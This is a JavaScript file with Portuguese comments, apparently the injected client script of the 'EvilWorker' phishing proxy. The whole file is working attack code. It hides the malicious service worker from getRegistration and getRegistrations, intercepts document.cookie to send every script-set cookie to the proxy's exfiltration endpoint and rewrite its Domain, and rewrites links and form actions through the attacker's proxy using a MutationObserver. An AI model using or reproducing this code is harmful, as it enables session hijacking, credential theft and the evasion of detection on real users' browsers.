// ══════════════════════════════════════════════════════════════
// BLOCO 1 – Oculta o Service Worker malicioso de getRegistration()
// Objetivo: impedir que scripts do site alvo detectem o SW via
//           navigator.serviceWorker.getRegistration()
// ══════════════════════════════════════════════════════════════
(function () {
    // Salva a referência original do método getRegistration antes de sobrescrevê-lo.
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;

    // Sobrescreve navigator.serviceWorker.getRegistration com uma versão interceptada.
    navigator.serviceWorker.getRegistration = function (_scope) {
        // Chama o método original para obter o registro real do SW.
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {

                // Se o SW ativo for o SW malicioso do EvilWorker (identificado pelo nome do arquivo),
                // retorna undefined — como se nenhum SW estivesse registrado.
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {

                    return undefined; // Esconde o SW malicioso retornando "nenhum registro encontrado"
                }
                // Para outros SWs (legítimos), retorna o registro normalmente.
                return registration;
            });
    };
})();

// ══════════════════════════════════════════════════════════════
// BLOCO 2 – Oculta o Service Worker malicioso de getRegistrations()
// Objetivo: impedir detecção via navigator.serviceWorker.getRegistrations()
//           que retorna TODOS os SWs registrados.
// ══════════════════════════════════════════════════════════════
(function () {
    // Salva a referência original do método getRegistrations.
    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;

    // Sobrescreve navigator.serviceWorker.getRegistrations com versão filtrada.
    navigator.serviceWorker.getRegistrations = function () {
        // Chama o método original para obter todos os registros de SW.
        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
            .then(registrations => {
                // Filtra a lista removendo o SW malicioso do EvilWorker.
                // Qualquer SW cujo scriptURL termine com o nome do SW malicioso é excluído da lista.
                return registrations.filter(registration => {

                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                })
            });
    };
})();

// ══════════════════════════════════════════════════════════════
// BLOCO 3 – Interceptação de cookies via document.cookie (JS Cookie Hijacking)
// Objetivo: capturar e exfiltrar cookies definidos por JavaScript,
//           e reescrever o atributo Domain para o domínio do proxy.
// ══════════════════════════════════════════════════════════════
(function () {
    // Obtém o descriptor original da propriedade "cookie" do Document.prototype.
    // Isso permite sobrescrever getter e setter mantendo o comportamento original.
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");

    // Redefine document.cookie com getter e setter personalizados.
    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor, // Herda as configurações originais (enumerable, configurable, etc.)
        get() {
            // Getter: retorna os cookies normalmente usando o getter original.
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            // Setter: intercepta TODA definição de cookie via JavaScript (ex: document.cookie = "...").
            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`; // Endpoint de exfiltração de cookies no proxy
            try {
                // Cria uma requisição XHR síncrona (false = bloqueante) para enviar o cookie ao proxy.
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false); // false = síncrono, bloqueia até receber resposta
                xhr.setRequestHeader("Content-Type", "text/plain"); // Envia o cookie como texto plano
                xhr.send(cookie); // Envia o valor bruto do cookie para o servidor do atacante

                // O proxy retorna a lista de domínios válidos (phishing + alvo) como JSON.
                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";

                // Itera sobre cada atributo do cookie (nome=valor; Domain=...; Path=...; etc.)
                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {

                    let attribute = cookieAttribute.trim(); // Remove espaços extras de cada atributo
                    if (attribute) {

                        // Verifica se este atributo é o "Domain" do cookie (case-insensitive).
                        const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
                        if (cookieDomainMatch) {

                            // Extrai o valor do domínio, removendo ponto inicial (ex: ".example.com" → "example.com").
                            const cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                            // Se o domínio original for um dos domínios válidos do alvo,
                            // substitui pelo domínio do proxy (para que o cookie funcione no contexto phishing).
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = `Domain=${self.location.hostname}`; // Reescreve o Domain para o domínio do proxy
                            }
                        }
                        modifiedCookie += `${attribute}; `; // Reconstrói o cookie com o atributo (possivelmente modificado)
                    }
                }
                // Define o cookie modificado no documento usando o setter original.
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            }
            catch (error) {
                // Registra falhas ao enviar o cookie ao proxy.
                console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
            }
        }
    });
})();


// ══════════════════════════════════════════════════════════════
// BLOCO 4 – MutationObserver para interceptar links e formulários dinâmicos
// Objetivo: reescrever URLs de <a href> e <form action> inseridos dinamicamente
//           no DOM para manter o usuário dentro do domínio do proxy.
// ══════════════════════════════════════════════════════════════

// Cria um MutationObserver para monitorar alterações no DOM em tempo real.
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        // Caso 1: Um atributo existente foi modificado (ex: href ou action alterado via JS).
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName); // Reescreve o atributo modificado
        }

        // Caso 2: Novos nós (elementos HTML) foram adicionados ao DOM.
        else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    // Se o nó recém-adicionado tiver href ou action definidos, reescreve-os.
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute); // Redireciona o link/formulário para o proxy
                    }
                }
            }
        }
    }
});

// Lista dos atributos HTML monitorados pelo MutationObserver.
// "href" cobre links <a>, "action" cobre formulários <form>.
const attributes = ["href", "action"];

// Inicia o MutationObserver na raiz do documento, observando toda a árvore DOM.
// childList: detecta adição/remoção de elementos.
// subtree: monitora todos os descendentes (não apenas filhos diretos).
// attributeFilter: restringe a observação apenas aos atributos "href" e "action".
observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

// Função que reescreve a URL de um atributo HTML para passar pelo proxy do atacante.
function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        // Converte o valor do atributo (href ou action) em um objeto URL para análise.
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);

        // Verifica se a URL aponta para um origin DIFERENTE do proxy (ou seja, para o site real alvo).
        if (htmlAttributeURL.origin !== self.location.origin) {
            // Cria uma URL de redirecionamento apontando para o endpoint de mutação do proxy.
            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
            // Adiciona a URL original como parâmetro "redirect_urI" (com "I" maiúsculo — técnica de evasão de filtros).
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));

            // Substitui o href/action original pela URL que passa pelo proxy do atacante.
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    }
    catch { } // Ignora silenciosamente erros (ex: URLs inválidas ou relativas)
}
